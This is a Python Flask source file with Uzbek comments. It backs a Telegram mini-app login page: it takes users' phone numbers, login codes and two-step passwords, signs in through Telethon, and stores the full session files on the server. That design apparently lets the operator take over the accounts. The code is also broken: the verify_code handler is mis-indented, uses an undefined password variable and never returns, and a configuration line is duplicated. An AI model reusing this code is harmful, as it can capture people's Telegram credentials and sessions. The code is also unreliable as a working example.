# login_api.py
import os
import asyncio
from flask import Flask, request, jsonify
from flask import render_template


from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

from database import get_db

API_HASH = os.getenv("API_HASH")

API_HASH = os.getenv("API_HASH")

API_ID_RAW = os.getenv("API_ID")
API_ID = int(API_ID_RAW) if API_ID_RAW else None

LOGIN_WEBAPP_URL = os.getenv("LOGIN_WEBAPP_URL")

DATABASE_URL = os.getenv("DATABASE_URL")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

app = Flask(__name__)

pending_codes = {}  # phone -> phone_code_hash

@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")

    async def _send():
        client = TelegramClient(
            os.path.join(SESSIONS_DIR, phone.replace("+", "")),
            API_ID,
            API_HASH
        )
        await client.connect()
        result = await client.send_code_request(phone)
        await client.disconnect()
        return result.phone_code_hash

    try:
        phone_code_hash = asyncio.run(_send())
        pending_codes[phone] = phone_code_hash
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route("/verify_code", methods=["POST"])
def verify_code():
    phone = request.json.get("phone")
    code = request.json.get("code")
    phone_code_hash = pending_codes.get(phone)

    if not phone_code_hash:
        return jsonify({"status": "error", "message": "Code expired"})

    async def _verify():
    # 1️⃣ vaqtinchalik phone-session
    temp_session = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
    client = TelegramClient(temp_session, API_ID, API_HASH)

    await client.connect()
    await client.sign_in(password=password)

    me = await client.get_me()
    await client.disconnect()

    # 2️⃣ ASOSIY session — USER_ID bilan
    final_session = os.path.join(SESSIONS_DIR, str(me.id))
    client = TelegramClient(final_session, API_ID, API_HASH)

    await client.connect()
    client.session.save()
    await client.disconnect()

    return me

@app.route("/verify_password", methods=["POST"])
def verify_password():
    phone = request.json.get("phone")
    password = request.json.get("password")

    async def _verify():
        # 1️⃣ vaqtinchalik phone-session
        temp_session = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
        client = TelegramClient(temp_session, API_ID, API_HASH)

        await client.connect()
        await client.sign_in(password=password)

        me = await client.get_me()
        await client.disconnect()

        # 2️⃣ asosiy session — USER_ID bilan
        final_session = os.path.join(SESSIONS_DIR, str(me.id))
        client = TelegramClient(final_session, API_ID, API_HASH)

        await client.connect()
        client.session.save()   # ❗ argument YO‘Q
        await client.disconnect()

        return me

    try:
        me = asyncio.run(_verify())
        return jsonify({"status": "ok"})

    except Exception as e:
        print("VERIFY_PASSWORD ERROR:", repr(e))
        return jsonify({"status": "error", "message": str(e)})



@app.route("/")
def index():
    return "LOGIN API ISHLAYAPTI"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

